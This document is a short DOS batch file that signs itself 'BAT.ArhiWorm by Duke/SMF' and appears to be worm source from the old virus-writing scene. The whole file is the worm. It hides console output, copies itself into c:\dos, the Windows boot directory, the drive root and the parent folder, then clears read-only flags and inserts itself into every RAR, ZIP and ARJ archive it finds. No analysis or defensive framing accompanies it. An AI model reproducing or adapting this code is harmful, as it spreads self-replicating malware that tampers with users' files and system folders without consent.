@ctty nul
copy %0 c:\dos\%0
copy %0 %winbootdir%\%0
copy %0 c:\%0
copy %0 ..\%0
for %%f in (*.rar *.zip *.arj) do attrib -r %%f
for %%r in (*.rar) do rar a -tk -y -c- -o+ %%r %0
for %%z in (*.zip) do pkzip -m %%z %0
for %%a in (*.arj) do arj a -d %%a %0
:BAT.ArhiWorm by Duke/SMF
ctty con